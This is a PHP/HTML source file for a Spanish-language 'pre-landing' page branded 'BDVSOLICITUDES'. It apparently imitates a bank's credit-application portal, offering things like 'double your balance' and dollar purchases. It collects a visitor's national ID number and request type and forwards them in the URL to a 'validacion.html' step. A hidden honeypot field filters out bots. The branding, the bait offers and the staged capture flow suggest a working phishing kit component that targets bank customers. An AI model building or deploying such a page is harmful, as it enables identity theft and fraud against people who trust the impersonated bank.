<?php
// index.php - Pre-Landing para captura de Cédula y Tipo de Solicitud

// Lógica de manejo de formulario
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    // ----------------------------------------------------------------
    // 🛡️ 1. VERIFICACIÓN HONEYPOT (Protección Anti-Bot)
    // Si este campo oculto fue rellenado por un bot, detenemos la ejecución.
    if (!empty($_POST['hp_email'])) {
        // El bot ha rellenado el campo trampa. Ignoramos la solicitud.
        // Podrías redirigir a una página de error, pero es mejor fallar silenciosamente.
        // Opcional: Escribir en un log que un bot fue detectado, pero no procesar los datos.
        exit;
    }
    // ----------------------------------------------------------------
    
    // Capturar datos del formulario
    $identificacion = $_POST['identificacion'] ?? '';
    $tipoSolicitud = $_POST['tipo_solicitud'] ?? '';

    if (!empty($identificacion) && !empty($tipoSolicitud)) {
        
        // Redirección final a validacion.html, enviando los datos por URL
        $redirectUrl = 'validacion.html?id=' . urlencode($identificacion) . '&type=' . urlencode($tipoSolicitud);
        
        header('Location: ' . $redirectUrl);
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
   <!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-975Y5PK1SE"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-975Y5PK1SE');
</script>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
    <title>BDVSOLICITUDES - Inicio</title>
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <link rel="icon" href="favicon.png" type="image/x-icon">
    <style>
        /* 🛡️ CSS para OCULTAR el Honeypot (Campo trampa) */
        .honeypot {
            position: absolute;
            opacity: 0;
            height: 0;
            width: 0;
            visibility: hidden;
            pointer-events: none;
        }

        /* [El resto de tu CSS (body, .container, etc.) sigue aquí...] */
        body {
            margin: 0; padding: 0; font-family: Arial, sans-serif; height: 100vh;
            display: flex; justify-content: center; align-items: center;
            background-image: url(background.webp); background-size: cover; background-position: center;
        }
        .container { display: flex; height: 100%; width: 80%; }
        .left-side { width: 40%; display: flex; justify-content: center; align-items: center; }
        .right-side { width: 30%; }
        .form { width: 80%; background: white; max-width: 550px; box-shadow: 0 5px 10px 0 rgba(0, 0, 0, 0.1); }

        @media (max-width: 768px) {
            body { background: #ededed; }
            .container { flex-direction: column; }
            .left-side { width: 100%; height: 100vh; }
            .right-side { display: none; }
        }

        .form-group { position: relative; margin-bottom: 20px; margin: 20px; }
        .form-group label {
            position: absolute; top: 50%; left: 10px; transform: translateY(-55%);
            color: #999; transition: top 0.3s, font-size 0.3s; pointer-events: none;
        }
        .form-group input, .form-group select {
            width: 100%; padding: 10px; box-sizing: border-box; position: relative;
            height: 60px; border: 0; border-bottom: 1px solid gray; background: #ededed;
            outline: none; 
            -webkit-appearance: none; 
            -moz-appearance: none; 
            appearance: none;
            padding-right: 30px;
        }
        
        /* CSS para añadir la flecha en el campo SELECT */
        .form-group select {
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23999'%3E%3Cpath d='M7 10l5 5 5-5z'/%3E%3C/svg%3E");
            background-repeat: no-repeat;
            background-position: right 10px center;
            background-size: 15px; 
        }
        
        .form-group input:focus + label,
        .form-group input:not(:placeholder-shown) + label,
        .form-group select:focus + label,
        .form-group select:valid + label,
        .form-group select:not([value=""]) + label {
            top: 5px; font-size: 12px;
        }
        .form-group select:valid + label { top: 5px; font-size: 12px; }

        #iniciarBtn {
            width: 180px; height: 38px; padding: 0; font-size: 16px;
            background-color: #0067b1; color: white; border-radius: 3px;
            cursor: pointer; border: none; transition: background-color 0.3s;
        }
        #iniciarBtn:disabled { background-color: #E0E0E0; cursor: not-allowed; }
        
    </style>
</head>
<body>
    <div class="container">
        <div class="left-side">
            <form id="solicitudForm" class="form" method="POST" action="index.php">
                <div style="text-align: center">
                    <img src="logo.png" alt="" style="width: 90%; margin-top: 20px" />
                </div>
                <div style="width: 100%; text-align: center">
                    <h4 style="color: #0067b1; margin-top: 20px; margin-bottom: 5px;">INICIAR SOLICITUD DE CRÉDITO</h4>
                    
                    <div class="form-group honeypot">
                        <input type="text" name="hp_email" id="hp_email" tabindex="-1" autocomplete="off" />
                        <label for="hp_email">No llenar este campo</label>
                    </div>
                    <div class="form-group">
                        <input
                            type="text"
                            id="identificacion"
                            name="identificacion"
                            style="width: 100%"
                            maxlength="12"
                            required
                            oninput="checkInputs(); quitarEspacios();"
                        />
                        <label for="identificacion" style="position: absolute; top: 15px; left: 2; font-size: 13px;">Número de Cedula *</label>
                    </div>
                    
                    <div class="form-group">
                        <select
                            id="tipo_solicitud"
                            name="tipo_solicitud"
                            style="width: 100%"
                            required
                            value=""
                            onchange="checkInputs()"
                        >
                            <option value="" disabled selected>Seleccione una opción...</option>
                            
                            <option value="Duplicar_Saldo">Duplica tu saldo</option>
                            <option value="TARJETA_CREDITO">Solicita tu Tarjeta de Crédito</option>
                            <option value="Aumento_TDC">Aumentar tu TDC</option>
                            <option value="Comprar_dolares">Compra divisas</option>
                            <option value="CREDIMUJER">Credimujer</option>
                            <option value="CREDIMOTO">Credimoto</option>
                            <option value="CREDICARRO">Credito Carro</option>
                            <option value="CREDICASA">Credito Casas</option>
                        </select>
                        <label for="tipo_solicitud" style="position: absolute; top: 15px; left: 2; font-size: 13px;">Tipo de Solicitud *</label>
                    </div>
                    
                </div>
                <div style="width: 100%; text-align: center; padding-bottom: 20px;">
                    <button type="submit" id="iniciarBtn" disabled>Continuar Solicitud</button> 
                </div>
            </form>
        </div>
        <div class="right-side"></div>
    </div>

    <script>
        // La validación en JavaScript para habilitar el botón (sin cambios)
        function checkInputs() {
            var identificacion = document.getElementById("identificacion").value.trim();
            var tipoSolicitud = document.getElementById("tipo_solicitud").value; 
            var button = document.getElementById("iniciarBtn");

            if (identificacion.length >= 6 && tipoSolicitud !== "") {
                button.disabled = false;
            } else {
                button.disabled = true;
            }
        }

        function quitarEspacios() {
            var inputId = document.getElementById("identificacion");
            inputId.value = inputId.value.trim();
        }
        
        // Inicializar el check al cargar
        window.onload = checkInputs;
    </script>
</body>
</html>